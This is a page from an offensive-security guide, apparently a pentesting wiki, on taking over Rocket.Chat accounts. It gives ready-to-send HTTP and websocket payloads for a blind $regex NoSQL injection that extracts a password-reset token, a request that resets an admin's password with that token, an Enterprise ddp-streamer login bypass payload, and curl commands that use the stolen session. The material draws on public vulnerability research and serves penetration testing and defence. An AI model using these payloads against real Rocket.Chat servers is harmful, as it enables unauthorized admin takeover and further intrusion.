---
title: "Authentication: NoSQL injection and account takeover in Rocket.Chat"
order: 2
description: "Attacking Rocket.Chat authentication: why the REST /api/v1/login does not fall to a naive operator object, the blind NoSQL injection in the account and password-reset methods that extracts a stored reset token character by character to take over an admin, and the Enterprise ddp-streamer username-lookup injection that becomes a bypass only with the separate missing-await password flaw."
keywords:
  - rocket.chat nosql injection
  - mongodb operator injection
  - password reset token extraction
  - ddp-streamer
  - account takeover
---

# Authentication

Rocket.Chat runs on Meteor's accounts system over MongoDB. The folklore bypass, posting `{"user":{"$gt":""},"password":{"$gt":""}}` to `/api/v1/login`, does not work: that REST endpoint coerces `user` and `password` to strings before building the query, so an operator object is rejected. The real weaknesses are elsewhere, in Meteor method calls and microservices that build a Mongo selector from attacker-controlled JSON without forcing scalar types. The highest-value one is a blind NoSQL injection that extracts a stored password-reset token, which turns into a full admin takeover without ever guessing a password.

## Preconditions

```bash
curl -s http://<target>:3000/api/info | python3 -c 'import sys,json;print(json.load(sys.stdin).get("version"))'
# the injection surface and the exact vulnerable method are version-bound; pin the build first
```

Confirm whether the account methods are reachable over REST method calls (`/api/v1/method.call/<name>`) or only over the DDP websocket (`/websocket`); older builds expose method calls unauthenticated, which is what makes the blind oracle usable pre-auth.

## Blind NoSQL injection to steal a reset token

Rocket.Chat stores a password-reset token on the user document at `services.password.reset.token` once a reset is requested. A vulnerable account method builds its Mongo selector from your JSON, so a `$regex` operator on that field turns the method into a boolean oracle: a request whose regex matches returns a different response (a success/`true`, a different body length, or a timing delta) from one that does not, letting you recover the token one character at a time.

First trigger a reset so the token exists, then extract it. Drive the oracle through the method call (shape is version-specific; the operator and the targeted field are the constant part):

```http
POST /api/v1/method.call/getPasswordPolicy HTTP/1.1
Host: target:3000
Content-Type: application/json

{"message":"{\"msg\":\"method\",\"method\":\"getPasswordPolicy\",\"params\":[{\"token\":{\"$regex\":\"^a.*\"}}],\"id\":\"1\"}"}
```

```text
# match  -> HTTP 200 with the policy object (regex matched a user whose reset token starts with 'a')
# miss   -> error / empty result (no user matched)
```

Walk the alphabet at each position (`^a`, `^b`, ... then `^<known>a`, `^<known>b`, ...) to rebuild the full `services.password.reset.token`. Automate the oracle rather than doing it by hand:

```bash
# conceptually: for each position, binary/linear search the charset on the match/miss signal
# nosqli-style tooling drives the same $regex oracle against the method parameter
```

With the token recovered, reset the target account's password directly:

```http
POST /api/v1/users.resetPassword HTTP/1.1
Host: target:3000
Content-Type: application/json

{"token":"<recovered-reset-token>","newPassword":"Owned-Passw0rd!"}
```

A `{"success":true}` means the password is set; log in normally as that user. Aim the extraction at a known admin email (from [enumeration](enumeration.md)) so the account you take over is `admin`.

## The Enterprise ddp-streamer path

On Enterprise builds that split the real-time layer into microservices, the `ddp-streamer` account service performs a username lookup that does accept an operator object, so `{"$regex":"admin"}` resolves to a real account. On its own that only selects a user; it becomes an authentication bypass when paired with a separate flaw where the password check is not awaited, so the login resolves before verification completes. Reach the streamer over its websocket method interface rather than the monolith REST login:

```json
{"msg":"method","method":"login","params":[{"user":{"$regex":"admin","$options":"i"},"password":"anything"}],"id":"1"}
```

The `result` frame returns `{"id":"<userId>","token":"<authToken>"}` when both conditions line up on the affected build. This path is narrow and version-bound; where it does not resolve, fall back to the reset-token extraction above, which is the more broadly applicable route.

## Using the token

Both routes end in a session pair. Rocket.Chat authenticates REST calls with two headers together:

```bash
curl -sk -H "X-Auth-Token: <authToken>" -H "X-User-Id: <userId>" \
  http://<target>:3000/api/v1/me | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d["username"],d.get("roles"))'
#   admin ['admin']   confirms the session is the admin account
```

## Follow-on

An admin session is the whole game: it unlocks the admin-only integration-script feature that runs server-side JavaScript, the code-execution route in [server exploitation](server-exploitation.md). A non-admin session still reads the directory and channels in [enumeration](enumeration.md) and is a foothold to pivot from.

## Tools

- [RocketChat/Rocket.Chat (server source, to read the vulnerable method per build)](https://github.com/RocketChat/Rocket.Chat)
- `wscat`/`websocat` to drive the DDP `method`/`login` calls over the websocket.
- [NoSQLMap](https://github.com/codingo/NoSQLMap) to automate the `$regex` extraction oracle.

## References

- [SonarSource: NoSQL injection in Rocket.Chat](https://www.sonarsource.com/blog/nosql-injections-in-rocket-chat/)
- [Rocket.Chat REST API reference](https://developer.rocket.chat/apidocs)
- [PortSwigger: NoSQL injection](https://portswigger.net/web-security/nosql-injection)
